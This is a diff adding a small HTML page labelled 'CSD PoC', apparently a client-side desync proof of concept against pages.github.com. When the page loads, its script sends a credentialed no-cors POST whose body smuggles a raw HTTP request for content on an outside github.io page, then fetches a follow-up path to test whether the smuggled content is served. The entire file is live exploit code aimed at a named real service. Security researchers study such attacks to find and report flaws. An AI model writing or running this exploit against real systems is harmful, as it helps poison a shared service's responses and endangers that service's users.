@@ -1,0 +1,19 @@
+<!doctype html>
+<html><body><h1>CSD PoC</h1>
+<script>
+const log = (m) => { document.title = m; console.log("POC:", m); };
+// Target: pages.github.com edge, hoping to smuggle attacker content onto its connection
+const TARGET = "https://pages.github.com/";
+const SMUG = "GET https://madaraninja1337.github.io/testing/ HTTP/1.1\r\nHost: madaraninja1337.github.io\r\n\r\n";
+async function run(){
+  try{
+    await fetch(TARGET, {method:"POST", body:SMUG, mode:"no-cors", credentials:"include"});
+    log("fetch1 ok");
+  }catch(e){ log("fetch1 err "+e); }
+  try{
+    const r = await fetch("https://pages.github.com/testing/", {credentials:"include"});
+    log("fetch2 status "+r.status);
+  }catch(e){ log("fetch2 err "+e); }
+}
+window.addEventListener("load", () => setTimeout(run, 300));
+</script></body></html>
